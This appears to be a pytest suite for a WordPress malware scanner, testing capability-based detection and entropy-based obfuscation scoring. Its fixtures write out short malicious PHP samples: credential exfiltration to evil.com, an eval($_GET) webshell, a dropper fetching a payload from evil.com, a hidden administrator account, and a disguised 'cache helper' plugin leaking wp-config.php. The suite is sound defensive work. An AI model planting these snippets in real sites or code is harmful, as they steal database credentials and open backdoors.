"""
CleanShift Test Suite — Behavioral Analysis Tests
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Tests for:
  - CapabilityMapper   (capability extraction, combo detection, scan)
  - EntropyScorer      (Shannon entropy, obfuscation detection, scan)

Uses pytest fixtures, tmp_path for filesystem, no external dependencies.
Python 3.6+ compatible.
"""

import math
import os
import string
from pathlib import Path

import pytest

from agent.src.models import (
    Severity,
    Threat,
    ThreatType,
    WordPressSite,
)
from agent.src.behavioral import (
    CapabilityMapper,
    CapabilityProfile,
    EntropyResult,
    EntropyScorer,
)


# ─── Fixtures ───────────────────────────────────────────────────────

@pytest.fixture
def wp_site(tmp_path):
    """Create a minimal WordPress site structure for behavioral tests."""
    site_path = tmp_path / "public_html"
    site_path.mkdir()

    # Core dirs
    (site_path / "wp-admin").mkdir()
    (site_path / "wp-includes").mkdir()
    (site_path / "wp-content").mkdir()
    (site_path / "wp-content" / "plugins").mkdir(parents=True)
    (site_path / "wp-content" / "themes").mkdir(parents=True)
    (site_path / "wp-content" / "mu-plugins").mkdir(parents=True)
    (site_path / "wp-content" / "uploads").mkdir(parents=True)

    # wp-config.php
    (site_path / "wp-config.php").write_text(
        "<?php\n"
        "define('DB_NAME', 'testdb');\n"
        "define('DB_USER', 'testuser');\n"
        "define('DB_PASSWORD', 'testpass');\n"
        "define('DB_HOST', 'localhost');\n"
        "$table_prefix = 'wp_';\n"
    )

    return WordPressSite(
        path=str(site_path),
        domain="example.com",
        wp_version="6.5.2",
        db_host="localhost",
        db_name="testdb",
        db_user="testuser",
        db_pass="testpass",
        db_prefix="wp_",
        site_owner="testuser",
    )


@pytest.fixture
def mapper():
    """Default CapabilityMapper instance."""
    return CapabilityMapper()


@pytest.fixture
def scorer():
    """Default EntropyScorer instance."""
    return EntropyScorer()


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# TestCapabilityMapper
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

class TestCapabilityMapper:
    """Tests for the CapabilityMapper behavioral engine."""

    def test_detects_credential_reading(self, mapper):
        """File with file_get_contents(wp-config) should detect reads_credentials."""
        content = b"<?php\n$c = file_get_contents(ABSPATH . 'wp-config.php');\n"
        profile = mapper.analyze_file("/test/evil.php", content)

        assert "reads_credentials" in profile.capabilities
        assert len(profile.capabilities["reads_credentials"]) >= 1

    def test_detects_http_calls(self, mapper):
        """File with wp_remote_post should detect makes_http_calls."""
        content = b"<?php\nwp_remote_post('https://example.com', array('body' => $data));\n"
        profile = mapper.analyze_file("/test/sender.php", content)

        assert "makes_http_calls" in profile.capabilities

    def test_detects_user_creation(self, mapper):
        """File with wp_create_user + set_role should detect creates_users."""
        content = (
            b"<?php\n"
            b"$uid = wp_create_user('admin2', 'pass123', 'a@b.com');\n"
            b"$u = new WP_User($uid);\n"
            b"$u->set_role('administrator');\n"
        )
        profile = mapper.analyze_file("/test/adduser.php", content)

        assert "creates_users" in profile.capabilities
        assert len(profile.capabilities["creates_users"]) >= 2

    def test_dangerous_combo_exfiltration(self, mapper):
        """File that reads credentials AND makes HTTP calls = exfiltration."""
        content = (
            b"<?php\n"
            b"$cfg = file_get_contents(ABSPATH . 'wp-config.php');\n"
            b"wp_remote_post('https://evil.com/collect', array('body' => $cfg));\n"
        )
        profile = mapper.analyze_file("/test/exfil.php", content)

        assert "reads_credentials" in profile.capabilities
        assert "makes_http_calls" in profile.capabilities
        assert len(profile.dangerous_combos) >= 1

        # Should match the exfiltration combo
        combo_descs = [d for _, _, d in profile.dangerous_combos]
        assert any("exfiltration" in d.lower() for d in combo_descs)

    def test_dangerous_combo_webshell(self, mapper):
        """File with eval + $_GET = classic webshell."""
        content = b"<?php\neval($_GET['cmd']);\n"
        profile = mapper.analyze_file("/test/shell.php", content)

        assert "executes_dynamic_code" in profile.capabilities
        assert "reads_http_input" in profile.capabilities
        assert len(profile.dangerous_combos) >= 1

        combo_descs = [d for _, _, d in profile.dangerous_combos]
        assert any("webshell" in d.lower() for d in combo_descs)

    def test_dangerous_combo_dropper(self, mapper):
        """File with file_put_contents + curl_exec = dropper."""
        content = (
            b"<?php\n"
            b"$ch = curl_init('https://evil.com/payload.php');\n"
            b"$data = curl_exec($ch);\n"
            b"file_put_contents('/tmp/backdoor.php', $data);\n"
        )
        profile = mapper.analyze_file("/test/dropper.php", content)

        assert "modifies_files" in profile.capabilities
        assert "makes_http_calls" in profile.capabilities
        assert len(profile.dangerous_combos) >= 1

        combo_descs = [d for _, _, d in profile.dangerous_combos]
        assert any("dropper" in d.lower() for d in combo_descs)

    def test_clean_file_no_combos(self, mapper):
        """Normal plugin code with only a single capability should not trigger combos."""
        content = (
            b"<?php\n"
            b"/**\n"
            b" * Plugin Name: My Clean Plugin\n"
            b" */\n"
            b"function my_plugin_init() {\n"
            b"    add_option('my_plugin_version', '1.0');\n"
            b"}\n"
            b"add_action('init', 'my_plugin_init');\n"
        )
        profile = mapper.analyze_file("/test/clean.php", content)

        assert len(profile.dangerous_combos) == 0
        assert profile.risk_score < 30

    def test_skips_wp_core_files(self, mapper, wp_site):
        """Files in wp-includes/ and wp-admin/ should be skipped by scan()."""
        site_path = Path(wp_site.path)

        # Put suspicious code in wp-includes (core — should be skipped)
        core_file = site_path / "wp-includes" / "load.php"
        core_file.write_bytes(
            b"<?php\n"
            b"$cfg = file_get_contents(ABSPATH . 'wp-config.php');\n"
            b"wp_remote_post('https://api.wordpress.org', array('body' => $cfg));\n"
        )

        threats = mapper.scan(wp_site)

        # Core file should NOT produce a threat
        core_threats = [t for t in threats if "load.php" in t.location]
        assert len(core_threats) == 0

    def test_risk_score_increases_with_combos(self, mapper):
        """More dangerous combos should produce a higher risk score."""
        # Single capability
        content_low = b"<?php\nadd_option('test', '1');\n"
        profile_low = mapper.analyze_file("/test/low.php", content_low)

        # Multiple dangerous capabilities
        content_high = (
            b"<?php\n"
            b"eval($_GET['x']);\n"
            b"system($_POST['cmd']);\n"
            b"file_put_contents('/tmp/b.php', $data);\n"
            b"curl_exec($ch);\n"
            b"base64_decode($s);\n"
            b"error_reporting(0);\n"
        )
        profile_high = mapper.analyze_file("/test/high.php", content_high)

        assert profile_high.risk_score > profile_low.risk_score

    def test_ai_generated_plugin_attack(self, mapper):
        """
        Realistic 'cache helper' AI-generated attack must be detected
        as CRITICAL (reads_credentials + makes_http_calls).

        This is the key test: clean-looking code that uses only
        legitimate WordPress APIs but combines them in a dangerous way.
        """
        content = (
            b"<?php\n"
            b"/**\n"
            b" * Plugin Name: WP Performance Cache Helper\n"
            b" */\n"
            b"function wpch_sync_headers($r) {\n"
            b"    $o = get_option('wpch_remote_config');\n"
            b"    if ($o && isset($o['endpoint'])) {\n"
            b"        wp_remote_post($o['endpoint'], ['body' => json_encode([\n"
            b"            'config' => file_get_contents(ABSPATH . 'wp-config.php')\n"
            b"        ])]);\n"
            b"    }\n"
            b"    return $r;\n"
            b"}\n"
            b"add_filter('wp_headers', 'wpch_sync_headers');\n"
        )
        profile = mapper.analyze_file("/test/cache-helper.php", content)

        # Must detect both capabilities
        assert "reads_credentials" in profile.capabilities, (
            "Should detect file_get_contents(wp-config.php) as reads_credentials"
        )
        assert "makes_http_calls" in profile.capabilities, (
            "Should detect wp_remote_post as makes_http_calls"
        )

        # Must flag the exfiltration combo
        assert len(profile.dangerous_combos) >= 1
        severities = [s for _, s, _ in profile.dangerous_combos]
        assert Severity.CRITICAL in severities, (
            "AI-generated exfiltration plugin must be rated CRITICAL"
        )

    def test_scan_integration(self, mapper, wp_site):
        """Full scan() should find threats in wp-content/plugins/."""
        site_path = Path(wp_site.path)
        plugin_dir = site_path / "wp-content" / "plugins" / "evil-plugin"
        plugin_dir.mkdir(parents=True)

        (plugin_dir / "evil.php").write_bytes(
            b"<?php\n"
            b"eval($_GET['cmd']);\n"
            b"system($_POST['x']);\n"
            b"file_put_contents('/tmp/a.php', $d);\n"
            b"curl_exec($ch);\n"
        )

        threats = mapper.scan(wp_site)
        assert len(threats) >= 1
        assert any("evil.php" in t.location for t in threats)

    def test_known_framework_skipped(self, mapper):
        """Files from WooCommerce/Elementor etc. should be skipped."""
        content = (
            b"<?php\n"
            b"/**\n"
            b" * WooCommerce main plugin file\n"
            b" */\n"
            b"$cfg = file_get_contents(ABSPATH . 'wp-config.php');\n"
            b"wp_remote_post('https://api.woo.com', array());\n"
            b"eval($template);\n"
        )
        # The _is_known_framework method should detect "woocommerce"
        assert mapper._is_known_framework(content) is True


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# TestEntropyScorer
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

class TestEntropyScorer:
    """Tests for the EntropyScorer obfuscation detector."""

    def test_normal_php_low_entropy(self, scorer, tmp_path):
        """Regular PHP code should have entropy below 5.5."""
        php_content = (
            "<?php\n"
            "/**\n"
            " * Plugin Name: My Normal Plugin\n"
            " * Description: A perfectly normal plugin.\n"
            " */\n"
            "\n"
            "function my_plugin_activate() {\n"
            "    add_option('my_plugin_version', '1.0.0');\n"
            "    add_option('my_plugin_settings', array(\n"
            "        'enabled' => true,\n"
            "        'color' => '#ffffff',\n"
            "        'title' => 'Default Title',\n"
            "    ));\n"
            "}\n"
            "register_activation_hook(__FILE__, 'my_plugin_activate');\n"
            "\n"
            "function my_plugin_deactivate() {\n"
            "    delete_option('my_plugin_version');\n"
            "}\n"
            "register_deactivation_hook(__FILE__, 'my_plugin_deactivate');\n"
        )
        test_file = tmp_path / "normal.php"
        test_file.write_text(php_content)

        result = scorer.score_file(str(test_file))
        assert result is not None
        assert result.overall_entropy < 5.5
        assert result.risk_level == "low"

    def test_obfuscated_high_entropy(self, scorer, tmp_path):
        """Base64/hex obfuscated code should have entropy above 5.8."""
        import base64
        import random

        # Generate many lines of random base64 to simulate obfuscated PHP
        random.seed(42)
        obf_lines = []
        for _ in range(10):
            random_bytes = bytes(random.randint(0, 255) for _ in range(300))
            encoded = base64.b64encode(random_bytes).decode("ascii")
            obf_lines.append(
                "$v%d = base64_decode('%s');" % (_, encoded)
            )

        content = "<?php\n" + "\n".join(obf_lines) + "\neval($v0);\n"
        test_file = tmp_path / "obfuscated.php"
        test_file.write_text(content)

        result = scorer.score_file(str(test_file))
        assert result is not None
        assert result.suspicious_line_count > 0
        assert result.risk_level in ("high", "critical")

    def test_long_obfuscated_line(self, scorer, tmp_path):
        """Single 5000+ char line with high entropy should be detected."""
        import random
        random.seed(123)

        # Single giant obfuscated line
        chars = string.ascii_letters + string.digits + "+/="
        giant_blob = "".join(random.choice(chars) for _ in range(6000))
        content = (
            "<?php\n"
            "$payload = '%s';\n"
            "eval(base64_decode($payload));\n"
            % giant_blob
        )
        test_file = tmp_path / "packed.php"
        test_file.write_text(content)

        result = scorer.score_file(str(test_file))
        assert result is not None
        assert result.longest_line_length >= 5000
        assert result.risk_level in ("high", "critical")

    def test_minified_js_skipped(self, scorer, tmp_path):
        """Minified JS files should not be analysed (entropy is naturally high)."""
        js_file = tmp_path / "app.min.js"
        js_file.write_text("var a=function(){return!0};var b=function(){return!1};" * 50)

        result = scorer.score_file(str(js_file))
        assert result is None

    def test_small_file_skipped(self, scorer, tmp_path):
        """Files under 100 bytes should not be analysed."""
        small_file = tmp_path / "tiny.php"
        small_file.write_text("<?php // hi\n")

        result = scorer.score_file(str(small_file))
        assert result is None

    def test_entropy_calculation_accuracy(self, scorer):
        """Verify Shannon entropy math against known values."""
        # All same byte -> entropy = 0
        data_uniform = b"aaaaaaaaaa"
        assert scorer._shannon_entropy(data_uniform) == 0.0

        # Two equally frequent bytes -> entropy = 1.0
        data_binary = b"abababababababab"
        ent = scorer._shannon_entropy(data_binary)
        assert abs(ent - 1.0) < 0.01, "Expected ~1.0 for two equally frequent bytes, got %.4f" % ent

        # Empty data -> 0
        assert scorer._shannon_entropy(b"") == 0.0

        # Full 256-byte spectrum -> entropy = 8.0
        data_full = bytes(range(256))
        ent_full = scorer._shannon_entropy(data_full)
        assert abs(ent_full - 8.0) < 0.01, "Expected ~8.0 for full byte range, got %.4f" % ent_full

    def test_scan_integration(self, scorer, wp_site, tmp_path):
        """Full scan() should find threats for high-entropy files in wp-content/."""
        import base64
        import random

        site_path = Path(wp_site.path)
        plugin_dir = site_path / "wp-content" / "plugins" / "evil-encoded"
        plugin_dir.mkdir(parents=True)

        # Create a high-entropy PHP file
        random.seed(99)
        lines = []
        for i in range(15):
            blob = bytes(random.randint(0, 255) for _ in range(350))
            encoded = base64.b64encode(blob).decode("ascii")
            lines.append("$d%d = base64_decode('%s');" % (i, encoded))

        content = "<?php\n" + "\n".join(lines) + "\neval($d0);\n"
        (plugin_dir / "encoded.php").write_text(content)

        threats = scorer.scan(wp_site)
        assert len(threats) >= 1
        assert any("encoded.php" in t.location for t in threats)

    def test_scan_skips_core_directories(self, scorer, wp_site):
        """Files in wp-admin/ and wp-includes/ should not be scanned."""
        site_path = Path(wp_site.path)

        import base64
        import random
        random.seed(77)

        # Put high-entropy file in wp-admin (should be skipped)
        lines = []
        for i in range(10):
            blob = bytes(random.randint(0, 255) for _ in range(350))
            encoded = base64.b64encode(blob).decode("ascii")
            lines.append("$x%d = '%s';" % (i, encoded))
        content = "<?php\n" + "\n".join(lines) + "\n"
        (site_path / "wp-admin" / "obf.php").write_text(content)

        threats = scorer.scan(wp_site)
        admin_threats = [t for t in threats if "wp-admin" in t.location]
        assert len(admin_threats) == 0

    def test_binary_file_skipped(self, scorer, tmp_path):
        """Binary files should be detected and skipped."""
        bin_file = tmp_path / "binary.php"
        bin_file.write_bytes(b"\x00\x01\x02\x03\x04" * 100)

        result = scorer.score_file(str(bin_file))
        assert result is None

    def test_entropy_result_fields(self, scorer, tmp_path):
        """EntropyResult should have all expected fields."""
        test_file = tmp_path / "test.php"
        test_file.write_text(
            "<?php\n"
            + "echo 'hello world';\n" * 20
        )

        result = scorer.score_file(str(test_file))
        assert result is not None
        assert isinstance(result.filepath, str)
        assert isinstance(result.overall_entropy, float)
        assert isinstance(result.max_line_entropy, float)
        assert isinstance(result.suspicious_line_count, int)
        assert isinstance(result.longest_line_length, int)
        assert result.risk_level in ("low", "medium", "high", "critical")
